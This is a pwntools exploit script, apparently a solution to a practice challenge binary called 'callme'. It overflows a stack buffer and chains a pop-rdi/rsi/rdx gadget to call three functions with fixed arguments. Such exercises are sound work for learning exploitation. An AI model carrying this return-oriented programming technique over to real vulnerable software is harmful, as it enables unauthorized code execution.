import pwn

binary = pwn.ELF("callme")


callme_one = 0x00401850
callme_two = 0x00401870
callme_three = 0x00401810

pop_x3 = 0x0000000000401ab0

# 0x0000000000401ab0: pop rdi; pop rsi; pop rdx; ret;

payload = b''
payload += ("D"*32).encode()
payload += ("B"*8).encode()
payload += pwn.p64(pop_x3)
payload += pwn.p64(0x1)
payload += pwn.p64(0x2)
payload += pwn.p64(0x3)
payload += pwn.p64(callme_one)

payload += pwn.p64(pop_x3)
payload += pwn.p64(0x1)
payload += pwn.p64(0x2)
payload += pwn.p64(0x3)
payload += pwn.p64(callme_two)

payload += pwn.p64(pop_x3)
payload += pwn.p64(0x1)
payload += pwn.p64(0x2)
payload += pwn.p64(0x3)
payload += pwn.p64(callme_three)

payload += "\n".encode()

p = pwn.tubes.process.process(["./callme"], shell=True)
p.send_raw(payload)
p.interactive()
p.close()
